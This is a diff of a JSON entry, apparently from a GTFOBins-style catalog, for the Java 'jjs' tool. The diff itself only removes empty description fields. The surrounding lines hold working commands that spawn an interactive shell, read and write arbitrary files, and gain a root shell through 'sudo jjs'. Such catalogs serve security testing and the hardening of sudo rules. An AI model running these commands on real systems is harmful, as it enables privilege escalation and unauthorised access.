@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | jjs\n"
       }
     ],
@@ -20,13 +20,13 @@
     ],
     "file-write": [
       {
-        "description": "",
+        
         "code": "echo 'var FileWriter = Java.type(\"java.io.FileWriter\");\nvar fw=new FileWriter(\"./file_to_write\");\nfw.write(\"DATA\");\nfw.close();' | jjs\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");\nvar FileReader = Java.type(\"java.io.FileReader\");\nvar br = new BufferedReader(new FileReader(\"file_to_read\"));\nwhile ((line = br.readLine()) != null) { print(line); }' | jjs\n"
       }
     ],
@@ -38,7 +38,7 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs\n"
       }
     ]
